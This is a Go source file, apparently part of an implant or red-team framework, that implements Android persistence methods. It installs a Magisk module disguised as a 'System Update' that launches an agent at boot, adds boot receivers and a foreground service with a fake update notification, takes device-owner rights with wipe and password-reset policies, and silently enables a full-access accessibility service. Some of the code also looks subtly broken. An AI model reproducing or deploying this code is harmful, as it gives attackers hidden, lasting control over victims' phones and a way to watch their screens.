package persistence

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"

	"github.com/angel-platform/angel/pkg/types"
)

type AndroidBaseMethod struct {
	BaseMethod
}

type MagiskModuleMethod struct {
	AndroidBaseMethod
}

func NewMagiskModuleMethod() *MagiskModuleMethod {
	return &MagiskModuleMethod{
		AndroidBaseMethod: AndroidBaseMethod{
			BaseMethod: BaseMethod{
				name:             "magisk_module",
				platform:         types.PlatformAndroid,
				requiresElevation: true,
			},
		},
	}
}

func (m *MagiskModuleMethod) Install(params *PersistenceParams) (*PersistenceResult, error) {
	if runtime.GOOS != "android" && runtime.GOOS != "linux" {
		return nil, fmt.Errorf("magisk module method only available on Android")
	}

	moduleName := params.Name
	if moduleName == "" {
		moduleName = "system_update"
	}

	moduleDir := filepath.Join("/data/adb/modules", moduleName)

	moduleProp := fmt.Sprintf(`id=%s
name=System Update
version=v1.0
versionCode=1
author=System
description=System update helper
`, moduleName)

	propsPath := filepath.Join(moduleDir, "module.prop")
	if err := os.MkdirAll(moduleDir, 0755); err != nil {
		return nil, fmt.Errorf("failed to create module directory: %w", err)
	}

	if err := os.WriteFile(propsPath, []byte(moduleProp), 0644); err != nil {
		return nil, fmt.Errorf("failed to write module.prop: %w", err)
	}

	serviceScript := fmt.Sprintf(`#!/system/bin/sh
%s %s &
`, params.AgentPath, params.AgentArgs)

	serviceDir := filepath.Join(moduleDir, "service")
	if err := os.MkdirAll(serviceDir, 0755); err != nil {
		return nil, fmt.Errorf("failed to create service directory: %w", err)
	}

	servicePath := filepath.Join(serviceDir, "post-fs-data.sh")
	if err := os.WriteFile(servicePath, []byte(serviceScript), 0755); err != nil {
		return nil, fmt.Errorf("failed to write service script: %w", err)
	}

	autorunScript := fmt.Sprintf(`#!/system/bin/sh
%s %s &
`, params.AgentPath, params.AgentArgs)

	autorunDir := filepath.Join(moduleDir, "system", "bin")
	if err := os.MkdirAll(autorunDir, 0755); err != nil {
		return nil, fmt.Errorf("failed to create autorun directory: %w", err)
	}

	autorunPath := filepath.Join(autorunDir, moduleName)
	if err := os.WriteFile(autorunPath, []byte(autorunScript), 0755); err != nil {
		return nil, fmt.Errorf("failed to write autorun script: %w", err)
	}

	return &PersistenceResult{
		Success: true,
		Method:  MethodMagiskModule,
		Details: map[string]string{
			"module_name": moduleName,
			"module_dir":  moduleDir,
		},
	}, nil
}

func (m *MagiskModuleMethod) Remove(params *PersistenceParams) error {
	if runtime.GOOS != "android" && runtime.GOOS != "linux" {
		return fmt.Errorf("magisk module method only available on Android")
	}

	moduleName := params.Name
	if moduleName == "" {
		moduleName = "system_update"
	}

	moduleDir := filepath.Join("/data/adb/modules", moduleName)
	return os.RemoveAll(moduleDir)
}

func (m *MagiskModuleMethod) Verify(params *PersistenceParams) (bool, error) {
	if runtime.GOOS != "android" && runtime.GOOS != "linux" {
		return false, fmt.Errorf("magisk module method only available on Android")
	}

	moduleName := params.Name
	if moduleName == "" {
		moduleName = "system_update"
	}

	moduleDir := filepath.Join("/data/adb/modules", moduleName)
	_, err := os.Stat(moduleDir)
	return err == nil, nil
}

type BootCompletedMethod struct {
	AndroidBaseMethod
}

func NewBootCompletedMethod() *BootCompletedMethod {
	return &BootCompletedMethod{
		AndroidBaseMethod: AndroidBaseMethod{
			BaseMethod: BaseMethod{
				name:             "boot_completed",
				platform:         types.PlatformAndroid,
				requiresElevation: false,
			},
		},
	}
}

func (m *BootCompletedMethod) Install(params *PersistenceParams) (*PersistenceResult, error) {
	if runtime.GOOS != "android" && runtime.GOOS != "linux" {
		return nil, fmt.Errorf("boot completed method only available on Android")
	}

	receiverName := params.Name
	if receiverName == "" {
		receiverName = "BootReceiver"
	}

	manifestContent := fmt.Sprintf(`<receiver android:name="%s" android:enabled="true" android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.BOOT_COMPLETED" />
        <action android:name="android.intent.action.QUICKBOOT_POWERON" />
    </intent-filter>
</receiver>`, receiverName)

	manifestPath := "/data/local/tmp/receiver.xml"
	if err := os.WriteFile(manifestPath, []byte(manifestContent), 0644); err != nil {
		return nil, fmt.Errorf("failed to write receiver manifest: %w", err)
	}

	serviceScript := fmt.Sprintf(`#!/system/bin/sh
am startservice -n %s/.BootService
`, params.Extra["package_name"])

	servicePath := filepath.Join("/data/local/tmp", "start_service.sh")
	if err := os.WriteFile(servicePath, []byte(serviceScript), 0755); err != nil {
		return nil, fmt.Errorf("failed to write service script: %w", err)
	}

	return &PersistenceResult{
		Success: true,
		Method:  MethodBootCompleted,
		Details: map[string]string{
			"receiver_name": receiverName,
			"manifest_path": manifestPath,
		},
	}, nil
}

func (m *BootCompletedMethod) Remove(params *PersistenceParams) error {
	if runtime.GOOS != "android" && runtime.GOOS != "linux" {
		return fmt.Errorf("boot completed method only available on Android")
	}

	os.Remove("/data/local/tmp/receiver.xml")
	os.Remove("/data/local/tmp/start_service.sh")
	return nil
}

func (m *BootCompletedMethod) Verify(params *PersistenceParams) (bool, error) {
	if runtime.GOOS != "android" && runtime.GOOS != "linux" {
		return false, fmt.Errorf("boot completed method only available on Android")
	}

	_, err := os.Stat("/data/local/tmp/receiver.xml")
	return err == nil, nil
}

type ForegroundServiceMethod struct {
	AndroidBaseMethod
}

func NewForegroundServiceMethod() *ForegroundServiceMethod {
	return &ForegroundServiceMethod{
		AndroidBaseMethod: AndroidBaseMethod{
			BaseMethod: BaseMethod{
				name:             "foreground_service",
				platform:         types.PlatformAndroid,
				requiresElevation: false,
			},
		},
	}
}

func (m *ForegroundServiceMethod) Install(params *PersistenceParams) (*PersistenceResult, error) {
	if runtime.GOOS != "android" && runtime.GOOS != "linux" {
		return nil, fmt.Errorf("foreground service method only available on Android")
	}

	serviceName := params.Name
	if serviceName == "" {
		serviceName = "SystemUpdateService"
	}

	serviceScript := fmt.Sprintf(`#!/system/bin/sh
am start-foreground-service -n %s/.%s --es "%s" "%s"
`, params.Extra["package_name"], serviceName, "command", params.AgentArgs)

	servicePath := filepath.Join("/data/local/tmp", "start_foreground.sh")
	if err := os.WriteFile(servicePath, []byte(serviceScript), 0755); err != nil {
		return nil, fmt.Errorf("failed to write foreground service script: %w", err)
	}

	notificationScript := `#!/system/bin/sh
cmd notification post -S bigtext -t "System Update" "tag_service" "Updating system components..."
`

	notifPath := filepath.Join("/data/local/tmp", "show_notification.sh")
	if err := os.WriteFile(notifPath, []byte(notificationScript), 0755); err != nil {
		return nil, fmt.Errorf("failed to write notification script: %w", err)
	}

	return &PersistenceResult{
		Success: true,
		Method:  MethodForegroundService,
		Details: map[string]string{
			"service_name": serviceName,
			"service_path": servicePath,
		},
	}, nil
}

func (m *ForegroundServiceMethod) Remove(params *PersistenceParams) error {
	if runtime.GOOS != "android" && runtime.GOOS != "linux" {
		return fmt.Errorf("foreground service method only available on Android")
	}

	os.Remove("/data/local/tmp/start_foreground.sh")
	os.Remove("/data/local/tmp/show_notification.sh")
	return nil
}

func (m *ForegroundServiceMethod) Verify(params *PersistenceParams) (bool, error) {
	if runtime.GOOS != "android" && runtime.GOOS != "linux" {
		return false, fmt.Errorf("foreground service method only available on Android")
	}

	_, err := os.Stat("/data/local/tmp/start_foreground.sh")
	return err == nil, nil
}

type DeviceAdminMethod struct {
	AndroidBaseMethod
}

func NewDeviceAdminMethod() *DeviceAdminMethod {
	return &DeviceAdminMethod{
		AndroidBaseMethod: AndroidBaseMethod{
			BaseMethod: BaseMethod{
				name:             "device_admin",
				platform:         types.PlatformAndroid,
				requiresElevation: true,
			},
		},
	}
}

func (m *DeviceAdminMethod) Install(params *PersistenceParams) (*PersistenceResult, error) {
	if runtime.GOOS != "android" && runtime.GOOS != "linux" {
		return nil, fmt.Errorf("device admin method only available on Android")
	}

	adminName := params.Name
	if adminName == "" {
		adminName = "SystemUpdateAdmin"
	}

	adminReceiver := fmt.Sprintf(`<device-admin xmlns:android="http://schemas.android.com/apk/res/android">
    <uses-policies>
        <limit-password />
        <watch-login />
        <reset-password />
        <force-lock />
        <wipe-data />
        <expire-password />
        <encrypted-storage />
        <disable-keyguard-features />
    </uses-policies>
    <application-label>%s</application-label>
    <application-icon>@android:drawable/ic_menu_info_details</application-icon>
    <description>System update administration component</description>
</device-admin>`, adminName)

	adminPath := "/data/local/tmp/device_admin.xml"
	if err := os.WriteFile(adminPath, []byte(adminReceiver), 0644); err != nil {
		return nil, fmt.Errorf("failed to write device admin XML: %w", err)
	}

	cmd := exec.Command("dpm", "set-device-owner",
		fmt.Sprintf("%s/%s", params.Extra["package_name"], adminName))
	if output, err := cmd.CombinedOutput(); err != nil {
		return nil, fmt.Errorf("failed to set device owner: %w: %s", err, string(output))
	}

	return &PersistenceResult{
		Success: true,
		Method:  MethodDeviceAdmin,
		Details: map[string]string{
			"admin_name": adminName,
			"admin_path": adminPath,
		},
	}, nil
}

func (m *DeviceAdminMethod) Remove(params *PersistenceParams) error {
	if runtime.GOOS != "android" && runtime.GOOS != "linux" {
		return fmt.Errorf("device admin method only available on Android")
	}

	adminName := params.Name
	if adminName == "" {
		adminName = "SystemUpdateAdmin"
	}

	cmd := exec.Command("dpm", "remove-device-owner",
		fmt.Sprintf("%s/%s", params.Extra["package_name"], adminName))
	_, err := cmd.CombinedOutput()

	os.Remove("/data/local/tmp/device_admin.xml")
	return err
}

func (m *DeviceAdminMethod) Verify(params *PersistenceParams) (bool, error) {
	if runtime.GOOS != "android" && runtime.GOOS != "linux" {
		return false, fmt.Errorf("device admin method only available on Android")
	}

	cmd := exec.Command("dpm", "list-owners")
	output, err := cmd.CombinedOutput()
	if err != nil {
		return false, nil
	}
	return strings.Contains(string(output), params.Extra["package_name"]), nil
}

type AndroidAccessibilityMethod struct {
	AndroidBaseMethod
}

func NewAndroidAccessibilityMethod() *AndroidAccessibilityMethod {
	return &AndroidAccessibilityMethod{
		AndroidBaseMethod: AndroidBaseMethod{
			BaseMethod: BaseMethod{
				name:             "android_accessibility",
				platform:         types.PlatformAndroid,
				requiresElevation: false,
			},
		},
	}
}

func (m *AndroidAccessibilityMethod) Install(params *PersistenceParams) (*PersistenceResult, error) {
	if runtime.GOOS != "android" && runtime.GOOS != "linux" {
		return nil, fmt.Errorf("accessibility method only available on Android")
	}

	serviceName := params.Name
	if serviceName == "" {
		serviceName = "AccessibilityService"
	}

	serviceConfig := fmt.Sprintf(`<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
    android:description="@string/accessibility_service_description"
    android:accessibilityEventTypes="typeAllMask"
    android:accessibilityFeedbackType="feedbackGeneric"
    android:notificationTimeout="100"
    android:canRetrieveWindowContent="true"
    android:settingsActivity=".SettingsActivity" />`)

	configPath := "/data/local/tmp/accessibility.xml"
	if err := os.WriteFile(configPath, []byte(serviceConfig), 0644); err != nil {
		return nil, fmt.Errorf("failed to write accessibility config: %w", err)
	}

	enableScript := fmt.Sprintf(`#!/system/bin/sh
settings put secure enabled_accessibility_services %s/%s
settings put secure accessibility_enabled 1
`, params.Extra["package_name"], serviceName)

	scriptPath := filepath.Join("/data/local/tmp", "enable_accessibility.sh")
	if err := os.WriteFile(scriptPath, []byte(enableScript), 0755); err != nil {
		return nil, fmt.Errorf("failed to write enable script: %w", err)
	}

	cmd := exec.Command("sh", scriptPath)
	if output, err := cmd.CombinedOutput(); err != nil {
		return nil, fmt.Errorf("failed to enable accessibility service: %w: %s", err, string(output))
	}

	return &PersistenceResult{
		Success: true,
		Method:  MethodAndroidAccessibility,
		Details: map[string]string{
			"service_name": serviceName,
			"config_path":  configPath,
		},
	}, nil
}

func (m *AndroidAccessibilityMethod) Remove(params *PersistenceParams) error {
	if runtime.GOOS != "android" && runtime.GOOS != "linux" {
		return fmt.Errorf("accessibility method only available on Android")
	}

	serviceName := params.Name
	if serviceName == "" {
		serviceName = "AccessibilityService"
	}

	disableScript := fmt.Sprintf(`#!/system/bin/sh
settings put secure enabled_accessibility_services ""
settings put secure accessibility_enabled 0
`)

	scriptPath := filepath.Join("/data/local/tmp", "disable_accessibility.sh")
	if err := os.WriteFile(scriptPath, []byte(disableScript), 0755); err != nil {
		return fmt.Errorf("failed to write disable script: %w", err)
	}

	cmd := exec.Command("sh", scriptPath)
	_, err := cmd.CombinedOutput()

	os.Remove("/data/local/tmp/accessibility.xml")
	os.Remove(scriptPath)
	return err
}

func (m *AndroidAccessibilityMethod) Verify(params *PersistenceParams) (bool, error) {
	if runtime.GOOS != "android" && runtime.GOOS != "linux" {
		return false, fmt.Errorf("accessibility method only available on Android")
	}

	serviceName := params.Name
	if serviceName == "" {
		serviceName = "AccessibilityService"
	}

	cmd := exec.Command("settings", "get", "secure", "enabled_accessibility_services")
	output, err := cmd.CombinedOutput()
	if err != nil {
		return false, nil
	}

	packageName := params.Extra["package_name"]
	return strings.Contains(string(output), fmt.Sprintf("%s/%s", packageName, serviceName)), nil
}

func getAndroidEnvVar(name string) string {
	return os.Getenv(name)
}
